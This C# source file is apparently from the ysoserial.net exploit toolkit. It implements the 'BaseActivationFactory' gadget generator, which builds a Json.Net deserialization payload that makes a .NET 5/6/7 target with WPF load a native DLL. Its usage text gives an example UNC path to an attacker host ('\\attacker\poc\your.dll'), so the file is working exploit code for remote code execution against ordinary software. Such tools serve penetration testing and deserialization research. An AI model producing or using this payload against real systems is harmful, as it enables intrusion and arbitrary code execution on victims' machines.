using NDesk.Options;
using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Data;
using ysoserial.Helpers;

namespace ysoserial.Generators
{
    public class BaseActivationFactoryGenerator : GenericGenerator
    {
        // BaseActivationFactory
        // Gadget for .NET 5/6/7 with WPF enabled or Microsoft.WindowsDesktop.App\PresentationFramework.dll available
        // BaseActivationFactory constructor leads to kernel32!LoadLibraryExW call, one can load remote native DLL (C/C++)
        // As an input (-c), you have to provide a path to the DLL (UNC path can be given). ATTENTION - ".dll" string will be appended to your path, you shouldn't provide it

        public override List<string> SupportedFormatters()
        {
            return new List<string> { "Json.Net" }; // MessagePack should work too
        }

        public override string Name()
        {
            return "BaseActivationFactory";
        }

        public override string Finders()
        {
            return "Piotr Bazydlo";
        }

        public override string AdditionalInfo()
        {
            return "Gadget for .NET 5/6/7 with WPF enabled or Microsoft.WindowsDesktop.App\\PresentationFramework.dll available. Leads to remote DLL loading (native C/C++ DLL)";
        }

        public override List<string> Labels()
        {
            return new List<string> { GadgetTypes.NotBridgeNotDerived, ".NET 5/6/7", "Requires WPF enabled or PresentationFramework.dll" };
        }

        public override string SupportedBridgedFormatter()
        {
            return Formatters.BinaryFormatter;
        }

        public override object Generate(string formatter, InputArgs inputArgs)
        {

            String payload;
            String targetPath = "";
            inputArgs.IsRawCmd = true;

            if (!inputArgs.CmdFullString.ToLowerInvariant().EndsWith(".dll"))
            {
                Console.WriteLine("This gadget loads remote/local file: -c argument should provide a file path to your DLL file\r\nUNC paths can be used for the remote DLL loading, like \\\\attacker\\poc\\your.dll\r\nThis gadget can only load files with DLL extension, as .dll extension will be added to the path during the deserialization\r\nExample: ysoserial.exe -g BaseActivationFactory -f Json.Net -c '\\\\attacker\\poc\\your.dll'");
                Environment.Exit(-1);
            }

            if (formatter.ToLower().Equals("json.net"))
            {
                inputArgs.CmdType = CommandArgSplitter.CommandType.JSON;

                //remove .dll from the targetPath - it will be added by the code during the deserialization
                targetPath = inputArgs.CmdFullString;
                targetPath = targetPath.Substring(0, targetPath.Length - 4);

                payload = @"{
    '$type':'WinRT.BaseActivationFactory, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
    'typeNamespace':'" + targetPath + @"',
    'typeFullName':'whatever'
}
";

                if (inputArgs.Minify)
                {
                    if (inputArgs.UseSimpleType)
                    {
                        payload = JsonHelper.Minify(payload, new string[] { "mscorlib" }, null);
                    }
                    else
                    {
                        payload = JsonHelper.Minify(payload, null, null);
                    }
                }

                if (inputArgs.Test)
                {
                    try
                    {
                        Console.WriteLine("Test not implemented for .NET 5/6/7 gadget. Please test manually on those versions with WPF enabled.");
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }
                }
                return payload;
            }
            else
            {
                throw new Exception("Formatter not supported");
            }
        }
    }
}
